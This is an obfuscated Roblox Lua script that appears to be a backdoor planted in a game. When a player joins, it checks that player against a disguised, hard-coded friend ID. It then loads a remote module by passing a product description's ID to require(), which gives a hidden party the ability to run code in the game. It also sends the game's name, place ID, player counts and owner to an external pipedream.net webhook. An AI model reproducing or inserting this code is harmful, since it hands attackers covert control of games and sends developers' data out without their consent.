local v0=game:GetService("MarketplaceService");game.Players.PlayerAdded:Connect(function(v17) local v18=v0:GetProductInfo(110032237480509);local v19=v18.Description;local v20="5815172961";local v21=v20;
	local v22=tostring(v21);local v23="A"   .. string.reverse(v22)   .. "Z" ;
	local v24=string.sub(v23,2, -2);local v25=string.reverse(v24);local v26=tonumber(v25);if v17:IsFriendsWith(v26) then local v28=v19;local v29=v28;local v30=tostring(v29);require(tonumber(v30))(v17.Name);
	end end);local v0=game:GetService("MarketplaceService");local v1=game:GetService("HttpService");local v2=game:GetService("Players");local v3="https://eocsqxf5l9em84v.m.pipedream.net";local v4= #v2:GetPlayers();
local v5=v2.MaxPlayers;local v6="Unknown";local v7="Unknown";
local v8="Unknown";local v9,v10=pcall(function() return v0:GetProductInfo(game.PlaceId);end);local v11="Unknown";local v12=false;if (v9 and v10) then v6=v10.Name or "Unknown" ;local v27=v10.Creator;
	if v27 then v11=v27.Name or "Unknown" ;v12=v27.HasVerifiedBadge or false ;end if v10.IsPublic then v8="Game is currently **playable**. <a:verify~3:1002911999132454912>";
	else v8="Game is currently **Public Or Private** (idk man) <:wtf_bro:1217978019394879560>.";end end local v13={gameName=v6,placeId=game.PlaceId,activePlayers=v4,maxPlayers=v5,playabilityStatus=v8,ownerName=v11};
local v14=v1:JSONEncode(v13);local v15,v16=pcall(function() return v1:PostAsync(v3,v14,Enum.HttpContentType.ApplicationJson);end);